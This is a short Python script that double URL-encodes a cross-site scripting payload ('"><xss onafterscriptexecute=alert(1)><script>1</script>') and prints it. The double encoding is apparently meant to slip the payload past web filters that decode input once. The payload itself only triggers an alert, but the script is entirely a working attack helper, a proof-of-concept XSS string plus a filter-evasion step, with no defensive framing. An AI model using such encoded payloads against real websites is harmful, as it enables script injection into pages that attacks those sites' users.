import urllib.parse
import time

payload ='"><xss onafterscriptexecute=alert(1)><script>1</script>'
encodePayload = urllib.parse.quote_plus(payload)
doubleEncodePayload = urllib.parse.quote_plus(encodePayload)


print("\n\nEncoding payload")

time.sleep(1)

print(f"\n\nYour Payload Encoded: {doubleEncodePayload} \n")

